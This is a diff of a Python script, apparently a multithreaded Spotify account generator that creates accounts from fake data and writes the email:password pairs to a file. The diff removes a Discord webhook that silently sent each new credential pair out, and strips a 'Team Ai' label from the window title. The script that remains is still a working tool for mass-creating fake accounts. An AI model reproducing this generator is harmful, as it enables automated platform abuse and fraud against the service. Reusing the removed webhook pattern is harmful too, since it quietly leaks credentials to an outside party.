@@ -5,12 +5,10 @@ from faker import Faker
 fake = Faker()
 import os
 import json
-import dhooks
-from dhooks import Webhook
+
 
 with open('config.json') as config_file:config = json.load(config_file)
-s = config['webhook']
-hook = Webhook(s)
+
 def intro():
     os.system('cls')
     print('Generating accounts!')
@@ -66,19 +64,15 @@ def generate():
             if r.json()['status']==1:
                 print(r.text)
                 print(Fore.BLUE + email+":"+passw+Fore.RESET)
-                try:
-                    hook.send(email + ':'+passw)
-                except:
-                    pass
                 file = open('accounts.txt','a')
                 file.write(email+':'+passw+'\n')
                 file.close()
                 success += 1
-                os.system('title Team Ai Spotify Gen - Success: '+str(success)+ ' Error: '+str(errors))
+                os.system('title Spotify Gen - Success: '+str(success)+ ' Error: '+str(errors))
             else:
                 print(Fore.LIGHTMAGENTA_EX + "Could not create the account, some errors occurred")
                 errors +=1
-                os.system('title Team Ai Spotify Gen - Success: '+str(success)  + ' Error: '+str(errors))
+                os.system('title Spotify Gen - Success: '+str(success)  + ' Error: '+str(errors))
     
 threads = []
 for i in range(threadCount):
